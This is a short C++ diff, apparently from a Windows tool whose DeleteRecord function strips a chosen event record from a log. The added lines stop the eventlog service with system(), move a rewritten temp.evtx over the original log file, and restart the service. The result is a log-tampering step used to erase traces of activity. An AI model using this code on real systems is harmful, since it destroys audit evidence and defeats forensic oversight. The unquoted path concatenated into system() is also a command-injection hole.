@@ -166,6 +166,16 @@ BOOL DeleteRecord(LPWSTR ReadPath, LPWSTR lpEventRecordId)
         cout << "EvtExportLog error " << GetLastError() << endl;
         return FALSE;
     }
+    system("net stop eventlog");
+
+    wstring lpPathW(lpPath);
+    string lpPathS(lpPathW.begin(), lpPathW.end());
+    string commandC = "move temp.evtx " + lpPathS;
+    const char* command = commandC.c_str();
+
+    system(command);
+
+    system("net start eventlog");
     return TRUE;
 }
 
